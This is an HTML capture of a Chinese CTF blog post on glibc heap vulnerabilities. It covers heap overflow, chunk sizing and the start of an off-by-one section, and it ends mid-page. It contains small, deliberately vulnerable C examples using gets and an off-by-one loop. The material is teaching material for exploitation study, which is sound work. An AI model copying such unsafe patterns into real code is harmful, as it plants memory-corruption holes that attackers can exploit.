<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>堆相关漏洞与利用 | 坠入星野的月🌙</title><meta name="author" content="uf4te"><meta name="copyright" content="uf4te"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="主要介绍了堆的一些常见漏洞和利用方法"><meta property="og:type" content="article"><meta property="og:title" content="堆相关漏洞与利用"><meta property="og:url" content="https://www.uf4te.cn/posts/baa7ab63.html"><meta property="og:site_name" content="坠入星野的月🌙"><meta property="og:description" content="主要介绍了堆的一些常见漏洞和利用方法"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.uf4te.cn/img/cover/cover-126.jpg"><meta property="article:published_time" content="2024-05-27T08:13:25.000Z"><meta property="article:modified_time" content="2024-06-06T16:34:53.000Z"><meta property="article:author" content="uf4te"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Pwn"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.uf4te.cn/img/cover/cover-126.jpg"><link rel="shortcut icon" href="/img/blog/avatar.jpg"><link rel="canonical" href="https://www.uf4te.cn/posts/baa7ab63.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//sdk.51.la"><meta name="baidu-site-verification" content="codeva-b3iLZWQECM"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload='this.media="all"'><script>!function(t){"use strict";!function(e){var r=window,s=document,n=t,c="".concat("https:"===s.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),i=s.createElement("script"),o=s.getElementsByTagName("script")[0];i.type="text/javascript",i.setAttribute("charset","UTF-8"),i.async=!0,i.src=c,i.id="LA_COLLECT",n.d=i;var a=function(){r.LA.ids.push(n)};r.LA?r.LA.ids&&a():(r.LA=t,r.LA.ids=[],a()),o.parentNode.insertBefore(i,o)}()}({id:"3GoBenqrrrBby5er",ck:"3GoBenqrrrBby5er",hashMode:!0})</script><script>!function(e,t,n,r){var i=t.createElement("script"),o=t.getElementsByTagName("script")[0];i.type="text/javascript",i.crossorigin=!0,i.onload=function(){(new e.LingQue.Monitor).init({id:"3GoBenqrrrBby5er"})},o.parentNode.insertBefore(i,o),i.src="https://sdk.51.la/perf/js-sdk-perf.min.js"}(window,document)</script><script>const GLOBAL_CONFIG={root:"/",algolia:{appId:"XY1UOYTY6S",apiKey:"4f03dfbbbff745c98fa4728e2ca61a96",indexName:"uf4te",hits:{per_page:10},languages:{input_placeholder:"搜索文章",hits_empty:"找不到您查询的内容：${query}",hits_stats:"找到 ${hits} 条结果，用时 ${time} 毫秒"}},localSearch:void 0,translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"简"},noticeOutdate:void 0,highlight:{plugin:"prismjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#323232",bgDark:"#696969",position:"bottom-center"},source:{justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js",css:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css"}},isPhotoFigcaption:!1,islazyload:!0,isAnchor:!1,percent:{toc:!1,rightside:!0}}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"堆相关漏洞与利用",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-06-07 00:34:53"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.getCSS=(e,t=!1)=>new Promise(((o,n)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=e,t&&(a.id=t),a.onerror=n,a.onload=a.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,o())},document.head.appendChild(a)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme");"dark"===t?activateDarkMode():"light"===t&&activateLightMode();const o=saveToLocal.get("aside-status");void 0!==o&&("hide"===o?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="/css/custom.css"></head><body><span id="fps"></span><script src="/js/reward.js"></script><script src="https://cdn1.tianli0.top/npm/sweetalert2@11.6.16/dist/sweetalert2.all.min.js"></script><script>var fdataUser={apiurl:"https://friends.uf4te.cn/",defaultFish:500,hungryFish:500}</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload='this.media="screen"'><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="坠入星野的月🌙" type="application/atom+xml"><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg" onerror='onerror=null,src="/img/404/loading_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>主页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-sharp fa-solid fa-book-open"></i> <span>文库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i> <span>文章归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>文章标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>文章分类</span></a></li><li><a class="site-page child" href="javascript:toRandomPost()"><i class="fa-fw fa-solid fa-car-side"></i> <span>随便逛逛</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-gift"></i> <span>休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fa-solid fa-headphones"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa-brands fa-youtube"></i> <span>视频</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-regular fa-images"></i> <span>图片</span></a></li><li><a class="site-page child" href="/play/"><i class="fa-fw fa-solid fa-gamepad"></i> <span>游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-circle-nodes"></i> <span>互动</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-sharp fa-solid fa-paper-plane"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa-solid fa-pen-nib"></i> <span>我的说说</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友情链接</span></a></li><li><a class="site-page child" href="/friends/"><i class="fa-fw fa-solid fa-user-group"></i> <span>友链朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-thumbs-up"></i> <span>推荐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tools/"><i class="fa-fw fa-solid fa-wrench"></i> <span>实用工具</span></a></li><li><a class="site-page child" href="/collect/"><i class="fa-fw fa-solid fa-mug-saucer"></i> <span>时空之海</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-user-astronaut"></i> <span>我的装备</span></a></li><li><a class="site-page child" href="/commentwall/"><i class="fa-fw fa-brands fa-skyatlas"></i> <span>言语星空</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-regular fa-address-card"></i> <span>关于本站</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image:url('/img/blog/default_top_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="坠入星野的月🌙"><img class="site-icon" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg"></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>主页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-sharp fa-solid fa-book-open"></i> <span>文库</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i> <span>文章归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>文章标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>文章分类</span></a></li><li><a class="site-page child" href="javascript:toRandomPost()"><i class="fa-fw fa-solid fa-car-side"></i> <span>随便逛逛</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-gift"></i> <span>休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fa-solid fa-headphones"></i> <span>音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa-brands fa-youtube"></i> <span>视频</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-regular fa-images"></i> <span>图片</span></a></li><li><a class="site-page child" href="/play/"><i class="fa-fw fa-solid fa-gamepad"></i> <span>游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-circle-nodes"></i> <span>互动</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-sharp fa-solid fa-paper-plane"></i> <span>留言板</span></a></li><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa-solid fa-pen-nib"></i> <span>我的说说</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友情链接</span></a></li><li><a class="site-page child" href="/friends/"><i class="fa-fw fa-solid fa-user-group"></i> <span>友链朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-thumbs-up"></i> <span>推荐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tools/"><i class="fa-fw fa-solid fa-wrench"></i> <span>实用工具</span></a></li><li><a class="site-page child" href="/collect/"><i class="fa-fw fa-solid fa-mug-saucer"></i> <span>时空之海</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-user-astronaut"></i> <span>我的装备</span></a></li><li><a class="site-page child" href="/commentwall/"><i class="fa-fw fa-brands fa-skyatlas"></i> <span>言语星空</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-regular fa-address-card"></i> <span>关于本站</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">堆相关漏洞与利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-sharp fa-regular fa-pen-to-square fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-27T08:13:25.000Z 2024-05-27 16:13:25">2024-05-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-06T16:34:53.000Z 2024-06-07 00:34:53">2024-06-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-folder-open fa-fw post-meta-icon"></i> <a class="post-meta-categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">二进制漏洞利用</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span> <span class="word-count">10.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span> <span>42分钟</span></span><span class="post-meta-separator">|</span><span data-flag-title="堆相关漏洞与利用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="waline-pageview-count" data-path="/posts/baa7ab63.html"><i class="fa-solid fa-spinner fa-spin"></i></span></span> <span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/baa7ab63.html#post-comment"><span class="waline-comment-count" data-path="/posts/baa7ab63.html"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s58 18 88 18 58-18 88-18 58 18 88 18v44h-352Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><blockquote><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数 <mark>（注意：是写入的字节数超过了堆块本身可使用的字节数，而不是用户申请的字节数，因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数）</mark>，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块，轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程</p><p>一般来说，堆溢出漏洞需要两个前提：</p><ol><li><strong>程序向堆上写入数据</strong></li><li><strong>写入的数据大小没有被良好地控制</strong></li></ol><p>参考文章：</p><ol><li><a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9oZWFwb3ZlcmZsb3ctYmFzaWMv">堆溢出 - CTF Wiki</a></li></ol></blockquote><p><em>与栈溢出不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此堆溢出通常无法像栈溢出一样直接控制 EIP</em></p><p>一般来说，我们利用堆溢出的策略是：</p><ol><li><p>覆盖与其<strong>物理相邻的下一个 <code>chunk</code></strong>&nbsp;的内容</p><ul><li><code>prev_size</code></li><li><code>size</code>，主要有三个比特位，以及该堆块真正的大小<ul><li><code>NON_MAIN_ARENA</code></li><li><code>IS_MAPPED</code></li><li><code>PREV_INUSE</code></li><li><code>the True chunk size</code></li></ul></li><li><code>chunk content</code>，从而改变程序固有的执行流</li></ul></li><li><p>利用堆中的机制（如 <code>unlink</code> 等 ）来实现任意地址写入或控制堆块中的内容等效果，从而来控制程序的执行流</p></li></ol><blockquote><p>堆溢出通常需要配合其他的方法来实现漏洞的利用，比较常用的方法有：Chunk Extend and Overlap 等</p></blockquote><hr><h2 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h2><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><blockquote><p>通常来说堆是通过调用 Glibc 函数 <code>malloc</code> 进行分配的，在某些情况下会使用 <code>calloc</code> 分配，<code>realloc</code> 同样也可以达到类似的效果</p><p>因此，常用的堆分配函数有：</p><ol><li><code>malloc</code></li><li><code>calloc</code></li><li><code>realloc</code></li></ol></blockquote><p><code>calloc</code> 与 <code>malloc</code> 的区别是&nbsp;<strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 等价于</span>
ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><blockquote><p>通过寻找危险函数，可以快速确定程序是否可能存在堆溢出漏洞</p></blockquote><p>常见的危险函数如下</p><ul><li><p>输入</p><ul><li>gets，直接读取一行，忽略&nbsp;<code>'\x00'</code></li><li>scanf</li><li>vscanf</li></ul></li><li><p>输出</p><ul><li>sprintf</li></ul></li><li><p>字符串</p><ul><li>strcpy，字符串复制，遇到&nbsp;<code>'\x00'</code>&nbsp;停止</li><li>strcat，字符串拼接，遇到&nbsp;<code>'\x00'</code>&nbsp;停止</li><li>bcopy</li></ul></li></ul><hr><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><blockquote><p>这一部分主要是计算我们开始写入的地址与我们所要覆盖的地址之间的距离</p></blockquote><p>主要有以下几点需要重点注意：</p><ul><li><em><code>malloc</code> 的参数并不等于实际分配堆块的大小</em></li></ul><p><strong><code>ptmalloc2</code> 分配出来的大小是对齐的，这个长度一般是字长的 2 倍</strong>。比如 32 位系统是 8 字节，64 位系统是 16 字节</p><p>因此，<strong>对于不大于 2 倍字长的请求，<code>malloc</code> 会直接返回 2 倍字长的块（也就是最小 <code>chunk</code>）</strong>，比如 64 位系统执行 <code>malloc(0)</code> 会返回用户区域为 16 字节的块</p><ul><li><em>用户区域的大小不等于 <code>chunk_head.size</code></em></li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">chunk_head.size = 用户区域大小 + 2 * 字长<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>用户申请的内存大小会被修改，有可能会使用与其物理相邻的下一个 <code>chunk</code> 的 <code>prev_size</code> 字段来储存内容</li></ul><p>例如：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>chunk<span class="token punctuation">;</span>
  chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上述代码中，申请的 <code>chunk</code> 大小是 24 字节</p><p>但是将其编译为 64 位可执行程序时，实际上分配的内存会是 16 字节而不是 24 字节</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//根据系统的位数，malloc 会分配 8 或 16 字节的用户空间</span>
<span class="token number">0x602000</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000021</span>
<span class="token number">0x602010</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000000</span>
<span class="token number">0x602020</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000020fe1</span>
<span class="token number">0x602030</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>16 字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 <code>pre_size</code> 域</p><p>用户申请的内存大小与 Glibc 中实际分配的内存大小之间的转换如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* pad request bytes into a usable size -- internal version */</span>
<span class="token comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">request2size</span><span class="token expression"><span class="token punctuation">(</span>req<span class="token punctuation">)</span>                                                      </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>                           </span><span class="token punctuation">\</span>
         <span class="token expression"><span class="token operator">?</span> MINSIZE                                                             </span><span class="token punctuation">\</span>
         <span class="token expression"><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>MALLOC_ALIGN_MASK<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>req = 24</code> 时，<code>request2size(24) = 32</code></p><p>除去 <code>chunk</code> 头部的 16 字节，实际上用户可用 <code>chunk</code> 为 16 字节，而 <code>chunk</code> 的 <code>pre_size</code> 仅当它的前一块处于释放状态时才起作用，所以用户这时候其实还可以使用下一个 <code>chunk</code> 的 <code>prev_size</code> 字段，正好 24 个字节</p><blockquote><p>实际上 <code>ptmalloc2</code> 分配内存是以双字为基本单位</p><p>以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 <code>chunk</code> 都是 16 字节对齐的</p></blockquote><hr><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><blockquote><p>off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且<strong>只越界了一个字节</strong>，属于一种特殊的溢出漏洞</p><p>参考文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9vZmYtYnktb25lLw==">堆中的 off-by-one - CTF Wiki</a></p></blockquote><p>off-by-one 最终的效果是可以将一个释放状态的 <code>small bin chunk</code> 或是 <code>unsorted bin chunk</code> 一直到被溢出 <code>chunk</code> 合并成一个大的 <code>chunk</code></p><hr><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>这种漏洞的产生往往与边界验证不严和字符串操作有关，例如：</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节</li></ul><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">my_gets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token keyword">int</span> size<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">;</span>
    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chunk2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">my_gets</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 for 循环的边界没有控制好，导致写入多执行了一次</p><p>执行 <code>my_gets()</code> 之前的堆：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A81.png" alt="CTF - PWN_堆相关的漏洞与利用1.png"></p><p>假设输入了 17 个字节：<code>aaaaaaaaaaaaaaaaa</code>，此时的堆：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A82.png" alt="CTF - PWN_堆相关的漏洞与利用2.png"></p><p>可以看到数据发生了溢出，有一个 <code>'a'</code> 覆盖到了下一个堆块的 <code>prev_size</code> 域</p><ul><li>字符串操作不合适</li></ul><p>示例：</p><pre class="line-numbers language-cpp" 